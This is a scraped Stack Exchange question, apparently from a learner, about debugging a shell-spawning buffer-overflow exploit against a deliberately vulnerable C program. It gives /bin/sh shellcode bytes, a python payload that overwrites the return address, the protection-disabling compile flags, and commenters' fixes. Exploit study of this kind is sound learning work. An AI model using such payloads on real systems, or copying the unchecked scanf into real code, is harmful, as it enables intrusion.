{
    "title": "Shellcode execution segfault",
    "link": "https://reverseengineering.stackexchange.com/questions/24791/shellcode-execution-segfault",
    "content": "I have been trying to exploit simple buffer overflow caused by scanf. I'm working on x86 Linux. The point is to spawn a shell. I sucesfully overwritten return address and jumped into my shellcode. But when it executes some strange thing occurs that i can't understand. The code that I'am working on is taken from here: https://dhavalkapil.com/blogs/Buffer-Overflow-Exploit/\nCompilation: gcc -fno-stack-protector -z execstack -o vuln vuln.c -m32\nASLR is disabled too.\nCode:\n<pre><code>#include <stdio.h>\n\nvoid secretFunction()\n{\n    printf(\"Congratulations!\n\");\n    printf(\"You have entered in the secret function!\n\");\n}\n\nvoid echo()\n{\n    char buffer[20];\n\n    printf(\"Enter some text:\n\");\n    scanf(\"%s\", buffer);\n    printf(\"You entered: %s\n\", buffer);    \n}\n\nint main()\n{\n    echo();\n\n    return 0;\n}\n</code></pre>\nI try to exploit it using this payload:\npython -c \"print '\\x31\\xC0\\x50\\x68\\x2F\\x2F\\x73\\x68\\x68\\x2F\\x62\\x69\\x6E\\x89\\xE3\\x50\\x53\\x89\\xe1\\xB0\\xFF\\x34\\xF4\\xCD\\x80' + '\\x41' * 3 + '\\x42' * 4+ '\\x8c\\xd6\\xff\\xff' \"\nshellcode(25) + padding(3) + ebp(4) + return(4)\nWhere the last part is return address. It succesfully jumps to my shellcode.\nHere is the assembly view of shellcode (after returning to overwritten address). I step instructions one by one up to mov %esp, %ecx(0xffffd69d)\n\n\nAnd then when i try to execute mov %esp, %ecx it goes one byte too close. EIP should point 0xffffd69f but it doesn't.\n\nI tested shellcode separately and it worked.\n<pre><code>int main()\n{\n    char buf[] = \"\\x31\\xC0\\x50\\x68\\x2F\\x2F\\x73\\x68\\x68\\x2F\\x62\\x69\\x6E\\x89\\xE3\\x50\\x53\\x89\\xe1\\xB0\\xFF\\x34\\xF4\\xCD\\x80\";\n    ((void (*)())(buf))();\n    return 0;\n}\n</code></pre>\nWhat I did wrong that it doesnt't work?\nEDIT:\nHad to update all pictures,\nRegisters dump before 'mov %esp,%ecx'\n",
    "votes": "2",
    "answers": 0,
    "views": "421",
    "tags": [
        "linux",
        "elf",
        "exploit",
        "shellcode"
    ],
    "user": "user32914",
    "time": "Apr 22, 2020 at 16:54",
    "comments": [
        {
            "user": "macro_controller",
            "text": "Could you post register dump at 0xffffd66d?\n",
            "time": null
        },
        {
            "user": "Paweł Łukasik",
            "text": "It looks like you are overwriting your stack. Similar issue (if not a dup even): reverseengineering.stackexchange.com/a/18508/18014\n",
            "time": null
        },
        {
            "user": "Anas Hadri",
            "text": "did you solve this problem ???\n",
            "time": null
        },
        {
            "user": "sudhackar",
            "text": "Probably the shellcode is on the stack and you do some push/pop's and overwrite some part of it. Adding something like <pre><code>sub esp, 0x78</code></pre> to the start of the shellcode should solve the problem\n",
            "time": null
        }
    ],
    "answers_data": []
}